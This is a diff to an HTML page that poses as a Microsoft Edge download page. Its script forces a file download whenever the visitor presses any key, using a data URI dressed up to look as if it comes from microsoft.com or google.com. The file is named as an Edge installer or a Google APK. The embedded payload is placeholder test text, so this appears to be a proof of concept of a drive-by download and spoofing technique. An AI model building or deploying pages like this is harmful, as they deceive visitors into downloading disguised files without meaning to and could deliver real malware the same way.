@@ -46,29 +46,36 @@
         <button class="btn-download" onclick="openWin()">Download Edge</button>
     </div>
 
-    <script>
-        // Mendengarkan interaksi keyboard (Keydown) sesuai struktur pengujian awal
-        window.addEventListener('keydown', function(e) {
-            openWin();
-        });
+      <script>
+    // Listen to any keydown
+    window.addEventListener('keydown', function(e) {
+      // open the download
+      openWin();
+      // request fullscreen
+      //goFullScreen();
+    });
 
-        // Fungsi pembantu untuk membuat elemen unduhan
-        function Puf(uri, name) {
-            const link = document.createElement("a");
-            link.href = uri;
-            link.download = name;
-            document.body.appendChild(link);
-            link.click();
-            document.body.removeChild(link);
-        }
+    // Download helper
+    function Puf(uri, name) {
+      const link = document.createElement("a");
+      link.href = uri;
+      link.download = name;
+      document.body.appendChild(link);
+      link.click();
+      document.body.removeChild(link);
+    }
 
-        // Fungsi unduhan yang disesuaikan menggunakan otoritas microsoft.com
-        function openWin() {
-            Puf(
-                "data://microsoft.com/application/x-msdownload;base64,ZXN0dGVzdGVzdHRlc3Q=",
-                "MicrosoftEdgeSetup.apk"
-            );
-        }
-    </script>
+    // Kick off your “APK” download
+    function openWin() {
+      Puf(
+        "data://google.com/application/x-msdownload;base64,ZXN0dGVzdGVzdHRlc3Q=",
+        "google.apk"
+      );
+    }
+
+  </script>
+  
+
+  
 </body>
 </html>
